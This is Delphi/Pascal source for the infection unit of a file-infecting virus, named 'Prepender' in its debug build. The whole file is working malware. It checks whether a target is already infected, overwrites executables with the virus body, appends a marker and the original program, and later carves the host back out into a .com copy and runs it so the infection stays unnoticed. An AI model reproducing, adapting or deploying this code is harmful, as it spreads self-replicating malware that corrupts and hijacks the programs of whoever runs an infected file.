   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT Prepender;
   {$ELSE}
   UNIT A11;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES
     AclUtils, Windows, Utils;
   {$ELSE}
   USES
     B1, A6, Windows;
   {$ENDIF}

   PROCEDURE DropFile;
   PROCEDURE Prepend(Virus,DestinationFile:STRING);

   IMPLEMENTATION

   VAR
     L : STRING = 'XFEARX';

   FUNCTION CheckInfection(Virus,DestinationFile:STRING) : Boolean;
   LABEL
     Abort;
   VAR
     I       : WORD;
     F       : FILE;
     G       : FILE;
     Buffer1 : ARRAY [0..2048] OF Byte;
     Buffer2 : ARRAY [0..2048] OF Byte;
   BEGIN
     Result:=False;
     Filemode:=0;
     AssignFile(F,Virus);
     AssignFile(G,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Reset(G,1);
     IF IOResult<>0 THEN GOTO Abort;
     BlockRead(F,Buffer1[0],2049);
     BlockRead(G,Buffer2[0],2049);
     I:=0;
     WHILE Buffer1[I]=Buffer2[I] DO INC(I);
     IF I=2049 THEN Result:=True ELSE Result:=False;
     CloseFile(F);
     CloseFile(G);
     Abort:
     {$I+}
   END;

   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   LABEL
     Abort;
   VAR
     F       : FILE;
     G       : FILE;
     I       : WORD;
     T       : STRING;
     New     : STRING;
     Count   : Longint;
     Buf     : ARRAY [1..2048] OF Byte;
   BEGIN
     IF CheckInfection(Virus,DestinationFile) THEN EXIT;
     {$I-}
     T:=LowerCase(L);
     CopyFile(pChar(DestinationFile),pChar(DestinationFile+'.tmp'),False);
     CopyFile(pChar(Virus),pChar(DestinatioNFile),False);
     FileMode:=2;
     AssignFile(F,DestinationFile);
     AssignFile(G,DestinationFile+'.tmp');
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Reset(G,1);
     IF IOResult<>0 THEN GOTO Abort;
     Seek(F,FileSize(F));
     BlockWrite(F,T[1],6);
     REPEAT
       BlockRead(G,Buf[1],2048,Count);
       BlockWrite(F,Buf[1],Count);
     UNTIL Count=0;
     CloseFile(G);
     CloseFile(F);
     Abort:
     {$I+}
     DeleteFile(pChar(DestinationFile+'.tmp'));
   END;

   PROCEDURE DropFile;
   VAR
     G     : FILE;
     S     : STRING;
     K     : STRING;
     T     : Longint;
     I     : Longint;
     Count : Longint;
     B     : ARRAY [1..6] OF Char;
     J     : ARRAY [1..2048] OF Byte;
   BEGIN
     K:=LowerCase(L);
     FileMode:=0;
     AssignFile(G,ParamStr(0));
     Reset(G,1);
     IF IOResult<>0 THEN Exit;
     REPEAT
       BlockRead(G,B[1],6);
       IF B<>K THEN Seek(G,FilePos(G)-5);
     UNTIL(FilePos(G)=FileSize(G)-6)OR(B=K);
     T:=FilePos(G);
     CloseFile(G);
     IF B<>K THEN Exit;
     S:=Copy(ParamStr(0),1,Length(ParamStr(0))-3)+'com';
     CopyFile(pChar(ParamStr(0)),pChar(S),False);
   //  SetFileAttributes(pChar(S),FILE_ATTRIBUTE_HIDDEN);
     FileMode:=2;
     AssignFile(G,S);
     Reset(G,1);
     IF IOResult<>0 THEN Exit;
     I:=0;
     REPEAT
       Seek(G,I+T);
       BlockRead(G,J[1],2048,Count);
       Seek(G,I);
       BlockWrite(G,J[1],Count);
       I:=I+Count;
     UNTIL Count<>2048;
     Truncate(G);
     CloseFile(G);
     WinExec(pChar(S),SW_SHOW);
     {$I+}
   END;

   END.
